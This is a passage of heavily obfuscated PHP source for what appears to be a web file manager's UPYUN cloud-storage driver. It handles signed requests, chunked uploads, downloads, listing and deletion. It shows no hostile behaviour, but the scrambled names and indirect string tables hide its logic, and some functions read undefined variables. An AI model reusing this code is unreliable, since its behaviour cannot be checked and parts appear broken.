hash($·İ„…Æº, $ÆÅ˜ô¨• = 0) { $ƒ•…°– = new PathDriverStream($·İ„…Æº, $ÆÅ˜ô¨•); return $ƒ•…°–->hashSimple($·İ„…Æº); } public static function md5($üÌ¶Äùö, $ÛŸÒöÁ = 0) { $¹ÎØ›º÷ = new PathDriverStream($üÌ¶Äùö, $ÛŸÒöÁ); return $¹ÎØ›º÷->hashMd5($üÌ¶Äùö); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\x3a\57\x2f\x76\x30\56\141\x70\x69\56\x75\160\171\165\156\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($õÁ¾ïŠé) { parent::__construct(); $this->_init($õÁ¾ïŠé); } public function _init($ŞÒÖ¹) { $çÁı“‚Ì =& $_SERVER[öæÛ¿©¿]; foreach ($ŞÒÖ¹ as $ºÕØ„Š¢ => $›¦Ğ¨Á¤) { if (isset($this->{$ºÕØ„Š¢})) { $this->{$ºÕØ„Š¢} = $›¦Ğ¨Á¤; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($çÁı“‚Ì[1694] . LNG($çÁı“‚Ì[1617])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($š¦ğÎëö, $ûäÍö = "\107\x45\124") { $Ê•ï¹®À =& $_SERVER[öæÛ¿©¿]; $ øêš™í = gmdate($Ê•ï¹®À[1646]); $×Å÷Ìƒ¨ = base64_encode(hash_hmac($Ê•ï¹®À[1695], "{$ûäÍö}\x26{$š¦ğÎëö}\46{$ øêš™í}", md5("{$this->userpass}"), !0)); $‹ÑŸÂñò = array("\101\x75\164\x68\x6f\x72\x69\x7a\141\x74\x69\157\x6e\x3a\x55\x50\x59\x55\116\x20{$this->username}\x3a{$×Å÷Ìƒ¨}", "\104\x61\x74\x65\72{$ øêš™í}"); return $‹ÑŸÂñò; } public function ussRequest($‰Õ±›üÅ, $®ŒŒÒìÊ = "\x47\x45\124", $İÊª¶ŸÊ = false, $º‹ñŸº„ = false, $×ò‰“É = false) { $ä²î®­ =& $_SERVER[öæÛ¿©¿]; $‰Õ±›üÅ = trim($‰Õ±›üÅ, $ä²î®­[8]); $ØÍ÷Æ¢æ = "\x2f{$this->bucket}\57" . rawurlencode($‰Õ±›üÅ); $´¶’„¿Ê = $this->ussHeaders($ØÍ÷Æ¢æ, $®ŒŒÒìÊ); if ($º‹ñŸº„) { $´¶’„¿Ê = array_merge($´¶’„¿Ê, $º‹ñŸº„); } $ŸñÏ³µó = url_request($this->endpoint . $ØÍ÷Æ¢æ, $®ŒŒÒìÊ, $İÊª¶ŸÊ, $´¶’„¿Ê, $×ò‰“É); if (!$ŸñÏ³µó) { $ŒÊÑÏËõ = LNG($ä²î®­[1696]); $this->writeLog($ŒÊÑÏËõ); return array($ä²î®­[1345] => !1, $ä²î®­[1335] => $ŒÊÑÏËõ); } if (strtolower($®ŒŒÒìÊ) == $ä²î®­[228] || in_array($ŸñÏ³µó[$ä²î®­[1345]], array($ä²î®­[262], $ä²î®­[1697]))) { $İÊª¶ŸÊ = $ŸñÏ³µó[$ä²î®­[1698]]; if (!$ŸñÏ³µó[$ä²î®­[842]]) { $İÊª¶ŸÊ = isset($İÊª¶ŸÊ[0]) ? $İÊª¶ŸÊ[0] : $ä²î®­[12]; } } else { $İÊª¶ŸÊ = json_decode($ŸñÏ³µó[$ä²î®­[1335]], !0); if (!$İÊª¶ŸÊ) { $İÊª¶ŸÊ = $ŸñÏ³µó[$ä²î®­[1335]]; } else { if (!$ŸñÏ³µó[$ä²î®­[842]] && isset($İÊª¶ŸÊ[$ä²î®­[1699]])) { $İÊª¶ŸÊ = $İÊª¶ŸÊ[$ä²î®­[1699]]; } } } if (!$ŸñÏ³µó[$ä²î®­[842]]) { $this->writeLog($this->__errorMessage($İÊª¶ŸÊ)); } return array($ä²î®­[1345] => $ŸñÏ³µó[$ä²î®­[842]], $ä²î®­[1335] => $İÊª¶ŸÊ); } private function __errorMessage($€ûÙø¬) { $ÙœÈá² =& $_SERVER[öæÛ¿©¿]; if (!$€ûÙø¬) { return $ÙœÈá²[12]; } static $È»óÊ = null; if (!$È»óÊ) { $È»óÊ = I18n::getType(); } if ($È»óÊ != $ÙœÈá²[1654]) { return $€ûÙø¬; } $ëÍ”ŸÅ„ = array($ÙœÈá²[1700] => $ÙœÈá²[1701], $ÙœÈá²[1702] => $ÙœÈá²[1703], $ÙœÈá²[1704] => $ÙœÈá²[1703], $ÙœÈá²[1705] => $ÙœÈá²[1706], $ÙœÈá²[1707] => $ÙœÈá²[1708], $ÙœÈá²[1709] => $ÙœÈá²[1710], $ÙœÈá²[1711] => $ÙœÈá²[1712]); return isset($ëÍ”ŸÅ„[$€ûÙø¬]) ? $ëÍ”ŸÅ„[$€ûÙø¬] : $€ûÙø¬; } public function mkfile($Ì¤æÈ‘ª, $¼ëò£ê× = '', $¾ı¤œ§ = REPEAT_RENAME) { if ($this->setContent($Ì¤æÈ‘ª, $¼ëò£ê×)) { return $this->getPathOuter($Ì¤æÈ‘ª); } return !1; } public function mkdir($á¾ìˆ–, $ËÍß¯¦ = REPEAT_SKIP) { $£ÖÔí•† =& $_SERVER[öæÛ¿©¿]; $…§øµÛø = trim($á¾ìˆ–, $£ÖÔí•†[8]); if ($this->_isFolder($…§øµÛø)) { return $this->getPathOuter($…§øµÛø); } $œ•¬ğ» = array($£ÖÔí•†[1713]); $ñ¤®öôç = $this->ussRequest($…§øµÛø, $£ÖÔí•†[289], !1, $œ•¬ğ»); return $ñ¤®öôç[$£ÖÔí•†[1345]] ? $this->getPathOuter($…§øµÛø) : !1; } public function copyFile($ÆŒ¥ÔğÃ, $àà™Ï”ø) { $åœ˜±ß‰ =& $_SERVER[öæÛ¿©¿]; $ºæùÛŒĞ = array($åœ˜±ß‰[1714] . "\57{$this->bucket}\x2f{$ÆŒ¥ÔğÃ}", $åœ˜±ß‰[1715]); $È‡…õØî = $this->ussRequest($àà™Ï”ø, $åœ˜±ß‰[254], !1, $ºæùÛŒĞ); return $È‡…õØî[$åœ˜±ß‰[1345]] ? !0 : $this->getPathOuter($àà™Ï”ø); } public function moveFile($Ù´ÜÂ«Å, $¤ç»•ûÂ) { $¡í»Ûşå =& $_SERVER[öæÛ¿©¿]; $‚¹Ü‹÷Â = array($¡í»Ûşå[1716] . "\x2f{$this->bucket}\57{$Ù´ÜÂ«Å}", $¡í»Ûşå[1715]); $¦Ğ¸¿Šú = $this->ussRequest($¤ç»•ûÂ, $¡í»Ûşå[254], !1, $‚¹Ü‹÷Â); return $¦Ğ¸¿Šú[$¡í»Ûşå[1345]] ? !0 : $this->getPathOuter($¤ç»•ûÂ); } public function delFile($èÂ¾Á‹Œ) { $ÓàÆ÷ƒ­ =& $_SERVER[öæÛ¿©¿]; $ºì˜÷¼ = $this->ussRequest($èÂ¾Á‹Œ, $ÓàÆ÷ƒ­[1717]); return $ºì˜÷¼[$ÓàÆ÷ƒ­[1345]] ? !0 : !1; } public function delFolder($ıÀãæ®é) { $Îóº­…Œ =& $_SERVER[öæÛ¿©¿]; if (!$this->exist($ıÀãæ®é)) { return !0; } $this->listItemCache = !1; $ñç¤ÜÒÔ = $ï˜ìÉÔÆ = array(); $this->fileList($ıÀãæ®é, $ñç¤ÜÒÔ, $ï˜ìÉÔÆ, !0); $this->listItemCache = !0; foreach ($ï˜ìÉÔÆ as $Î”Œî±õ) { $Ë“ïÆ›‰ = $this->ussRequest($Î”Œî±õ[$Îóº­…Œ[32]], $Îóº­…Œ[1717]); if (!$Ë“ïÆ›‰[$Îóº­…Œ[1345]]) { return !1; } } usort($ñç¤ÜÒÔ, function ($ÆãÔŒ¦°, $£Ú»°ş¬) { $Æ“ÎÖÂ§ =& $_SERVER[öæÛ¿©¿]; return substr_count($£Ú»°ş¬, $Æ“ÎÖÂ§[8]) - substr_count($ÆãÔŒ¦°, $Æ“ÎÖÂ§[8]); }); foreach ($ñç¤ÜÒÔ as $‰âÃ‚òØ) { $Ë“ïÆ›‰ = $this->ussRequest($‰âÃ‚òØ, $Îóº­…Œ[1717]); if (!$Ë“ïÆ›‰[$Îóº­…Œ[1345]]) { return !1; } } $Ë“ïÆ›‰ = $this->ussRequest($ıÀãæ®é, $Îóº­…Œ[1717]); return $Ë“ïÆ›‰[$Îóº­…Œ[1345]]; } public function rename($®İ¤›±“, $³ë¦ÑÓ) { if ($this->isFile($®İ¤›±“)) { $³ë¦ÑÓ = get_path_father($®İ¤›±“) . $³ë¦ÑÓ; return $this->moveFile($®İ¤›±“, $³ë¦ÑÓ); } return $this->renameObject($®İ¤›±“, $³ë¦ÑÓ); } public function fileInfo($¥†¸°Ã”, $Ì“ÃšãË = false, $“–§õ— = array()) { $óı› £³ =& $_SERVER[öæÛ¿©¿]; $®¡ÇÍ¸ = array($óı› £³[32] => $this->pathThis($¥†¸°Ã”), $óı› £³[87] => $this->getPathOuter($óı› £³[8] . $¥†¸°Ã”), $óı› £³[33] => $óı› £³[231], $óı› £³[79] => isset($“–§õ—[$óı› £³[79]]) ? $“–§õ—[$óı› £³[79]] : 0, $óı› £³[167] => $this->ext($¥†¸°Ã”)); if ($Ì“ÃšãË) { return $®¡ÇÍ¸; } $®¡ÇÍ¸[$óı› £³[232]] = $®¡ÇÍ¸[$óı› £³[88]] = 0; $®¡ÇÍ¸[$óı› £³[233]] = $®¡ÇÍ¸[$óı› £³[234]] = !0; if (empty($“–§õ—)) { $“–§õ— = $this->objectMeta($¥†¸°Ã”); if (!$“–§õ—) { return $®¡ÇÍ¸; } } $®¡ÇÍ¸[$óı› £³[232]] = intval($“–§õ—[$óı› £³[1718]]); $®¡ÇÍ¸[$óı› £³[88]] = intval($“–§õ—[$óı› £³[1719]]); $®¡ÇÍ¸[$óı› £³[79]] = $“–§õ—[$óı› £³[79]]; return $®¡ÇÍ¸; } public function folderInfo($äÖØü˜„, $’Ô–ğÇÃ = false) { $ÚÍÀ¶Ü =& $_SERVER[öæÛ¿©¿]; $û¡óìÂ = array($ÚÍÀ¶Ü[32] => $this->pathThis($äÖØü˜„), $ÚÍÀ¶Ü[87] => $this->getPathOuter($ÚÍÀ¶Ü[8] . $äÖØü˜„), $ÚÍÀ¶Ü[33] => $ÚÍÀ¶Ü[78]); if ($’Ô–ğÇÃ) { return $û¡óìÂ; } $û¡óìÂ[$ÚÍÀ¶Ü[232]] = $û¡óìÂ[$ÚÍÀ¶Ü[88]] = 0; $û¡óìÂ[$ÚÍÀ¶Ü[233]] = $û¡óìÂ[$ÚÍÀ¶Ü[234]] = !0; if (empty($ì‹•Óì­)) { $ì‹•Óì­ = $this->objectMeta($äÖØü˜„); if (!$ì‹•Óì­) { return $û¡óìÂ; } } $û¡óìÂ[$ÚÍÀ¶Ü[232]] = intval($ì‹•Óì­[$ÚÍÀ¶Ü[1718]]); $û¡óìÂ[$ÚÍÀ¶Ü[88]] = intval($ì‹•Óì­[$ÚÍÀ¶Ü[1719]]); return $û¡óìÂ; } private function listObjs($ç£°®ØÆ, $ß£‡îÙ™ = 0, $¼ú‡¾î = 1000) { $–¸¹Üìá =& $_SERVER[öæÛ¿©¿]; $¡†ÉûÃí = array($–¸¹Üìá[1720], $–¸¹Üìá[1721] . $¼ú‡¾î); if ($ß£‡îÙ™) { $¡†ÉûÃí[] = $–¸¹Üìá[1722] . $ß£‡îÙ™; } $‡¯áâå¼ = $this->ussRequest($ç£°®ØÆ, $–¸¹Üìá[1551], !1, $¡†ÉûÃí); return !$‡¯áâå¼[$–¸¹Üìá[1345]] ? !1 : $‡¯áâå¼[$–¸¹Üìá[1335]]; } private function fileList($æğ˜«÷¹, &$çâÉó¥, &$ëü½¨Ø¿, $…ÎƒŒú÷ = false) { $Âøê«˜ô =& $_SERVER[öæÛ¿©¿]; $ãˆØ¥ŸÌ = $Âøê«˜ô[12]; $¾Æ‰¬ÓŠ = 1000; $° ¿ı•† = rtrim($æğ˜«÷¹, $Âøê«˜ô[8]) . $Âøê«˜ô[8]; while (!0) { check_abort(); $é³¨°ş¨ = $this->listObjs($æğ˜«÷¹, $ãˆØ¥ŸÌ, $¾Æ‰¬ÓŠ); if (!$é³¨°ş¨) { return !1; } $ãˆØ¥ŸÌ = isset($é³¨°ş¨[$Âøê«˜ô[1723]]) ? $é³¨°ş¨[$Âøê«˜ô[1723]] : $Âøê«˜ô[12]; $ôòèØğû = isset($é³¨°ş¨[$Âøê«˜ô[1724]]) ? $é³¨°ş¨[$Âøê«˜ô[1724]] : array(); foreach ($ôòèØğû as $Í´îà¹Ä) { $åĞ¸ÏæÃ = $Í´îà¹Ä[$Âøê«˜ô[33]] == $Âøê«˜ô[78] ? !0 : !1; $ùÎˆğáÂ = ltrim($° ¿ı•† . $Í´îà¹Ä[$Âøê«˜ô[32]], $Âøê«˜ô[8]) . ($åĞ¸ÏæÃ ? $Âøê«˜ô[8] : $Âøê«˜ô[12]); $ß¿¼ÒİÁ = array($Âøê«˜ô[32] => $ùÎˆğáÂ, $Âøê«˜ô[33] => $åĞ¸ÏæÃ ? $Âøê«˜ô[78] : $Âøê«˜ô[231], $Âøê«˜ô[79] => $Í´îà¹Ä[$Âøê«˜ô[413]], $Âøê«˜ô[1719] => $Í´îà¹Ä[$Âøê«˜ô[1725]]); $this->cacheMethodInfoSet($ùÎˆğáÂ, $åĞ¸ÏæÃ, $ß¿¼ÒİÁ); if ($åĞ¸ÏæÃ) { $çâÉó¥[] = $ùÎˆğáÂ; if ($…ÎƒŒú÷) { $this->fileList($ùÎˆğáÂ, $çâÉó¥, $ëü½¨Ø¿, $…ÎƒŒú÷); } continue; } $ëü½¨Ø¿[] = $ß¿¼ÒİÁ; } if (count($ôòèØğû) < $¾Æ‰¬ÓŠ) { break; } } $this->cacheMethodInfoSet($æğ˜«÷¹, !0); } public function listPath($»ÌÅ¾ıá, $ÒíĞÈšä = false) { $­›Ø“•å =& $_SERVER[öæÛ¿©¿]; $ä²ĞáØ = $ííü¢İË = array(); $this->fileList($»ÌÅ¾ıá, $ä²ĞáØ, $ííü¢İË); foreach ($ä²ĞáØ as $”ôèä±é => $ô€ü“Éï) { $ä²ĞáØ[$”ôèä±é] = $this->folderInfo($ô€ü“Éï, $ÒíĞÈšä); } foreach ($ííü¢İË as $”ôèä±é => $ô€ü“Éï) { $ííü¢İË[$”ôèä±é] = $this->fileInfo($ô€ü“Éï[$­›Ø“•å[32]], $ÒíĞÈšä, $ô€ü“Éï); } return array($­›Ø“•å[85] => $ä²ĞáØ, $­›Ø“•å[86] => $ííü¢İË); } public function has($Èıí„Ã, $´åœ³”¾ = false, $¼£‹ø÷É = true) { $²Ğû¼¿ =& $_SERVER[öæÛ¿©¿]; $ÁÚçù› = $²Ğû¼¿[12]; $¶º€’± = 500; $˜¿ˆ¨ø = 0; $‚àí¶Í = 0; $´©ÆÅ¨³ = rtrim($Èıí„Ã, $²Ğû¼¿[8]) . $²Ğû¼¿[8]; while (!0) { check_abort(); $ÃøâŸ­í = $this->listObjs($Èıí„Ã, $ÁÚçù›, $¶º€’±); if (!$ÃøâŸ­í) { return !1; } $ÁÚçù› = isset($ÃøâŸ­í[$²Ğû¼¿[1723]]) ? $ÃøâŸ­í[$²Ğû¼¿[1723]] : $²Ğû¼¿[12]; $õ¢Üœ€ö = isset($ÃøâŸ­í[$²Ğû¼¿[1724]]) ? $ÃøâŸ­í[$²Ğû¼¿[1724]] : array(); if (empty($õ¢Üœ€ö)) { break; } $àªó¬¶ = array_filter($õ¢Üœ€ö, function ($±Ÿ‰ŒŠ) { $à‚îŞ› =& $_SERVER[öæÛ¿©¿]; return $±Ÿ‰ŒŠ[$à‚îŞ›[33]] == $à‚îŞ›[78]; }); $ªö¼ã¢å = count($õ¢Üœ€ö); $àªó¬¶ = count($àªó¬¶); $ûŸó÷µ‘ = $ªö¼ã¢å - $àªó¬¶; if ($´åœ³”¾) { $‚àí¶Í += $àªó¬¶; $˜¿ˆ¨ø += $ûŸó÷µ‘; if ($ªö¼ã¢å < $¶º€’±) { break; } continue; } if ($¼£‹ø÷É) { if ($ûŸó÷µ‘) { return !0; } } else { if ($àªó¬¶) { return !0; } } if ($ªö¼ã¢å < $¶º€’±) { break; } } if ($´åœ³”¾) { return array($²Ğû¼¿[240] => $˜¿ˆ¨ø, $²Ğû¼¿[241] => $‚àí¶Í); } return !1; } public function listAll($õñİó«) { $Şá¯éÖ³ =& $_SERVER[öæÛ¿©¿]; $¨ïè×Ô“ = $ğçµ±ù = array(); $this->fileList($õñİó«, $¨ïè×Ô“, $ğçµ±ù, !0); $ÊõşßŞÇ = array_to_keyvalue($ğçµ±ù, $Şá¯éÖ³[32]); foreach ($¨ïè×Ô“ as $µ­Õ…) { if (is_string($µ­Õ…)) { $ÊõşßŞÇ[$µ­Õ…] = array($Şá¯éÖ³[79] => 0); } } return $this->listAllFiles($õñİó«, $ÊõşßŞÇ); } public function canRead($ªƒ…Ë“µ) { return $this->exist($ªƒ…Ë“µ) ? !0 : !1; } public function canWrite($ªæÍº™) { return $this->exist($ªæÍº™) ? !0 : !1; } public function getContent($ÈŠàßÀà) { return $this->fileSubstr($ÈŠàßÀà, 0, -1); } public function setContent($­ËÓÊîæ, $˜ÚÛ«‰ = '') { $ô½´‚Ö¥ =& $_SERVER[öæÛ¿©¿]; if (!$˜ÚÛ«‰) { $¥¶úâÖî = $this->ussRequest($­ËÓÊîæ, $ô½´‚Ö¥[289]); return $¥¶úâÖî[$ô½´‚Ö¥[1345]]; } $¹”úñì© = $this->tempFile($this->pathThis($­ËÓÊîæ)); file_put_contents($¹”úñì©, $˜ÚÛ«‰); if ($this->upload($­ËÓÊîæ, $¹”úñì©)) { $this->tempFileRemve($¹”úñì©); return !0; } return !1; } public function fileSubstr($òÁ ´ä, $íÒü¿µ–, $§Ë½ê‘„) { $„ÀæÌÊ‡ =& $_SERVER[öæÛ¿©¿]; if (!($¤éÃ’õş = $this->link($òÁ ´ä))) { return !1; } $¸óÔíšÛ = !1; if ($§Ë½ê‘„ > 0) { $÷¯ŒöÀ = $íÒü¿µ– + $§Ë½ê‘„ - 1; $¸óÔíšÛ = array($„ÀæÌÊ‡[1550] . $íÒü¿µ– . $„ÀæÌÊ‡[473] . $÷¯ŒöÀ); } $Î½Æ™¡Ò = url_request($¤éÃ’õş, $„ÀæÌÊ‡[1551], !1, $¸óÔíšÛ); return $Î½Æ™¡Ò[$„ÀæÌÊ‡[842]] ? $Î½Æ™¡Ò[$„ÀæÌÊ‡[1335]] : !1; } public function upload($“¥²˜µÙ, $Ö°ŸºÁ×, $š»ùé™Õ = false, $‘ÍÉ½ì‰ = REPEAT_REPLACE) { $»‹Âîëß =& $_SERVER[öæÛ¿©¿]; if (!$Ö°ŸºÁ× || !@file_exists($Ö°ŸºÁ×)) { return !1; } $÷è²“‚ = IO::size($Ö°ŸºÁ×); if ($÷è²“‚ <= 1024 * 1024 * 200) { $ßËÈ‘ = array($»‹Âîëß[1726] . $Ö°ŸºÁ×); $•Ú†¤ñ¼ = $this->ussRequest($“¥²˜µÙ, $»‹Âîëß[254], $ßËÈ‘); return $•Ú†¤ñ¼[$»‹Âîëß[1345]] ? $this->getPathOuter($“¥²˜µÙ) : !1; } $ôüËªé® = 1024 * 1024 * 10; $Åó‹èàà = array($»‹Âîëß[1727], $»‹Âîëß[1728] . $÷è²“‚, $»‹Âîëß[1729], $»‹Âîëß[1730] . $ôüËªé®); $•Ú†¤ñ¼ = $this->ussRequest($“¥²˜µÙ, $»‹Âîëß[254], !1, $Åó‹èàà); if (!$•Ú†¤ñ¼[$»‹Âîëß[1345]]) { return !1; } $„öƒş–¾ = $•Ú†¤ñ¼[$»‹Âîëß[1335]]; $Œ¸úê’â = 0; $¢ê˜ğ§ = $„öƒş–¾[$»‹Âîëß[1731]]; $Ë×¬†îÁ = fopen($Ö°ŸºÁ×, $»‹Âîëß[1611]); if (!$Ë×¬†îÁ) { return !1; } do { $˜µ‚´üÍ = $„öƒş–¾[$»‹Âîëß[1732]]; fseek_64($Ë×¬†îÁ, $Œ¸úê’â); $úƒ—‹êÓ = fread($Ë×¬†îÁ, $˜µ‚´üÍ); $¾Ğ¬‡€ = 0; do { $¾Ğ¬‡€++; $„öƒş–¾ = $this->uploadPart($“¥²˜µÙ, $„öƒş–¾, $úƒ—‹êÓ); } while (!$„öƒş–¾ && $¾Ğ¬‡€ < 3); if (!$„öƒş–¾) { return !1; } $¢ê˜ğ§ = $„öƒş–¾[$»‹Âîëß[1731]]; $Œ¸úê’â += $˜µ‚´üÍ; } while ($¢ê˜ğ§ != -1); fclose($Ë×¬†îÁ); $Åó‹èàà = array($»‹Âîëß[1733], $»‹Âîëß[1734] . $„öƒş–¾[$»‹Âîëß[1735]], $»‹Âîëß[1729]); $•Ú†¤ñ¼ = $this->ussRequest($“¥²˜µÙ, $»‹Âîëß[254], !1, $Åó‹èàà); return $•Ú†¤ñ¼[$»‹Âîëß[1345]] ? $this->getPathOuter($ËÓ¯€ÁÚ) : !1; } private function uploadPart($÷È«§õ, $æ­­¼¡, &$ß„Àò›™) { $‰á£Üöå =& $_SERVER[öæÛ¿©¿]; $„¦´¯ÉÆ = array($‰á£Üöå[1736], $‰á£Üöå[1734] . $æ­­¼¡[$‰á£Üöå[1735]], $‰á£Üöå[1737] . $æ­­¼¡[$‰á£Üöå[1731]], $‰á£Üöå[144] . $æ­­¼¡[$‰á£Üöå[1732]]); $ òÕùîÊ = $this->ussRequest($÷È«§õ, $‰á£Üöå[254], $ß„Àò›™, $„¦´¯ÉÆ); return !$ òÕùîÊ[$‰á£Üöå[1345]] ? $ òÕùîÊ[$‰á£Üöå[1345]] : $ òÕùîÊ[$‰á£Üöå[1335]]; } public function uploadFormData($Ú ¹Ìˆ», $¸‚ëâ±ñ = 3600) { return $this->uploadPolicy($Ú ¹Ìˆ», $¸‚ëâ±ñ); } public function uploadMultiData($Ñ²å£ì¸, $ÏŒÙ›‹ú = 3600) { $“¼£Áê’ =& $_SERVER[öæÛ¿©¿]; $¾ë¢èšÈ = (int) $GLOBALS[$“¼£Áê’[7]][$“¼£Áê’[79]]; return $this->uploadPolicy($Ñ²å£ì¸, $ÏŒÙ›‹ú, $¾ë¢èšÈ); } private function uploadPolicy($î÷¶ÅÈÈ, $ŸÅö‚’ = 3600, $çŠŸË¼ã = 0) { $ûéÜ‰›À =& $_SERVER[öæÛ¿©¿]; $œµÒíøé = $ûéÜ‰›À[8] . $this->bucket; $ĞÍÙÇ™ = gmdate($ûéÜ‰›À[1646]); $ƒ­€›Õè = array($ûéÜ‰›À[1738] => $this->bucket, $ûéÜ‰›À[1739] => $î÷¶ÅÈÈ, $ûéÜ‰›À[1740] => time() + $ŸÅö‚’, $ûéÜ‰›À[1741] => $ĞÍÙÇ™); if ($çŠŸË¼ã) { $ƒ­€›Õè[$ûéÜ‰›À[1631]] = $çŠŸË¼ã; } $ÇäÀîù„ = base64_encode(json_encode($ƒ­€›Õè)); $‰ñ´™¨´ = base64_encode(hash_hmac($ûéÜ‰›À[1695], "\x50\117\x53\x54\x26{$œµÒíøé}\46{$ĞÍÙÇ™}\46{$ÇäÀîù„}", md5("{$this->userpass}"), !0)); $ ¤Ùäßš = array($ûéÜ‰›À[278] => $ÇäÀîù„, $ûéÜ‰›À[1742] => "\x55\x50\131\x55\116\x20{$this->username}\x3a{$‰ñ´™¨´}", $ûéÜ‰›À[207] => $this->endpoint . $œµÒíøé); return $ ¤Ùäßš; } public function download($âºÓåë¯, $ğïĞ±ï†) { $ÙšæØ¸ = IO::getPathInner(IO::mkfile($ğïĞ±ï†)); if (!($ÆÊ¨ùÌ” = $this->link($âºÓåë¯))) { return !1; } $§ìÊâÁÁ = 0; $ç÷õÁ½½ = 1024 * 200; $ƒèûà‚ = fopen($ÙšæØ¸, $_SERVER[öæÛ¿©¿][1690]); while (!0) { $ıÖÑ•‰Ã = $this->fileSubstr($âºÓåë¯, $§ìÊâÁÁ, $ç÷õÁ½½); if ($ıÖÑ•‰Ã === !1) { return !1; } fwrite($ƒèûà‚, $ıÖÑ•‰Ã); $§ìÊâÁÁ += $ç÷õÁ½½; if (strlen($ıÖÑ•‰Ã) < $ç÷õÁ½½) { break; } } fclose($ƒèûà‚); return $ğïĞ±ï†; } public function link($Èª¯ü÷, $ñÑ¬îòæ = array()) { $Î©ÌŸÉğ =& $_SERVER[öæÛ¿©¿]; $Èª¯ü÷ = trim($Èª¯ü÷, $Î©ÌŸÉğ[8]); if (!empty($this->token)) { $È‡»şĞá = strtotime(date($Î©ÌŸÉğ[1743])); $†€çÈŠã = substr(md5($this->token . $Î©ÌŸÉğ[285] . $È‡»şĞá . $Î©ÌŸÉğ[1744] . $Èª¯ü÷), 12, 8) . $È‡»şĞá; $ñÑ¬îòæ[] = $Î©ÌŸÉğ[1745] . $†€çÈŠã; } $Àõòˆë¹ = !empty($ñÑ¬îòæ) ? $Î©ÌŸÉğ[76] . implode($Î©ÌŸÉğ[285], $ñÑ¬îòæ) : $Î©ÌŸÉğ[12]; return $this->getHost() . $Î©ÌŸÉğ[8] . $this->pathEncode($Èª¯ü÷) . $Àõòˆë¹; } public function fileOut($ÛÜÆéÍ, $ûìÃÁÑë = false, $¥ĞÙØ‚ = false, $ê„åüù = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÛÜÆéÍ, $ûìÃÁÑë, $¥ĞÙØ‚, $ê„åüù); } if (!$¥ĞÙØ‚) { $¥ĞÙØ‚ = $this->pathThis($ÛÜÆéÍ); } $‹– „ˆù = $ûìÃÁÑë ? array($_SERVER[öæÛ¿©¿][1746] . rawurlencode($¥ĞÙØ‚)) : array(); $œäÂİ·ı = $this->link($ÛÜÆéÍ, $‹– „ˆù); $this->fileOutLink($œäÂİ·ı); } public function fileOutServer($‰ãÜñ”, $µåÎí“ = false, $¿‹â³‡Ç = false, $‰Î¥›Ç = '') { parent::fileOut($‰ãÜñ”, $µåÎí“, $¿‹â³‡Ç, $‰Î¥›Ç); } public function fileOutImage($œ…ºƒë†, $ÉÄ•Æ¤ö = 250) { $Àø§‹ıú = $this->link($œ…ºƒë† . $_SERVER[öæÛ¿©¿][1747] . $ÉÄ•Æ¤ö); $this->fileOutLink($Àø§‹ıú); } public function fileOutImageServer($ıÛòÒ ¨, $ì¦—ÉãÙ = 250) { parent::fileOutImage($ıÛòÒ ¨, $ì¦—ÉãÙ); } public function hashMd5($«şÉŞÕ) { $Ü§‘àÜ =& $_SERVER[öæÛ¿©¿]; $°ş¢ÎÜŒ = $this->_objectMeta($«şÉŞÕ); return isset($°ş¢ÎÜŒ[$Ü§‘àÜ[246]]) ? $°ş¢ÎÜŒ[$Ü§‘àÜ[246]] : !1; } public function size($Êç°İº) { $©¬ë’€æ = $this->objectMeta($Êç°İº); return $©¬ë’€æ ? $©¬ë’€æ[$_SERVER[öæÛ¿©¿][79]] : 0; } public function info($ãöı³¾ğ) { if ($this->isFolder($ãöı³¾ğ)) { return $this->folderInfo($ãöı³¾ğ); } else { if ($this->isFile($ãöı³¾ğ)) { return $this->fileInfo($ãöı³¾ğ); } } return !1; } public function exist($Øß‘İå‰) { return $this->isFile($Øß‘İå‰) || $this->isFolder($Øß‘İå‰); } public function isFile($²˜áì—û) { return !$this->isFolder($²˜áì—û) && $this->objectMeta($²˜áì—û); } public function isFolder($®ğ×˜è) { return $this->cacheMethod($_SERVER[öæÛ¿©¿][178], $®ğ×˜è); } protected function objectMeta($Ú ­Êà“) { return $this->cacheMethod($_SERVER[öæÛ¿©¿][180], $Ú ­Êà“); } protected function _objectMeta($ûıİ±ò) { $øÓîŠÓ÷ =& $_SERVER[öæÛ¿©¿]; if ($ûıİ±ò == $øÓîŠÓ÷[12] || $ûıİ±ò == $øÓîŠÓ÷[8]) { return array(); } $É“Ê¢™Ê = $this->ussRequest($ûıİ±ò, $øÓîŠÓ÷[1748]); if (!$É“Ê¢™Ê[$øÓîŠÓ÷[1345]]) { return null; } $äÛ›³Â¾ = isset($É“Ê¢™Ê[$øÓîŠÓ÷[1335]]) ? $É“Ê¢™Ê[$øÓîŠÓ÷[1335]] : array(); if (!isset($äÛ›³Â¾[$øÓîŠÓ÷[1749]])) { return null; } $şèñâÈ¸ = array($øÓîŠÓ÷[33] => isset($äÛ›³Â¾[$øÓîŠÓ÷[1749]]) ? $äÛ›³Â¾[$øÓîŠÓ÷[1749]] : null, $øÓîŠÓ÷[79] => isset($äÛ›³Â¾[$øÓîŠÓ÷[1750]]) ? $äÛ›³Â¾[$øÓîŠÓ÷[1750]] : null, $øÓîŠÓ÷[246] => isset($äÛ›³Â¾[$øÓîŠÓ÷[1751]]) ? $äÛ›³Â¾[$øÓîŠÓ÷[1751]] : null, $øÓîŠÓ÷[1718] => isset($äÛ›³Â¾[$øÓîŠÓ÷[1752]]) ? $äÛ›³Â¾[$øÓîŠÓ÷[1752]] : null); $şèñâÈ¸[$øÓîŠÓ÷[1719]] = isset($äÛ›³Â¾[$øÓîŠÓ÷[1753]]) ? strtotime($äÛ›³Â¾[$øÓîŠÓ÷[1753]]) : $şèñâÈ¸[$øÓîŠÓ÷[1718]]; return $şèñâÈ¸; } protected function _isFolder($„ËôÙâ‘) { $öğ°Ç¬² =& $_SERVER[öæÛ¿©¿]; if ($„ËôÙâ‘ == $öğ°Ç¬²[12] || $„ËôÙâ‘ == $öğ°Ç¬²[8]) { return !0; } $ã‰“ŞÒ‘ = $this->_objectMeta($„ËôÙâ‘); return isset($ã‰“ŞÒ‘[$öğ°Ç¬²[33]]) && $ã‰“ŞÒ‘[$öğ°Ç¬²[33]] == 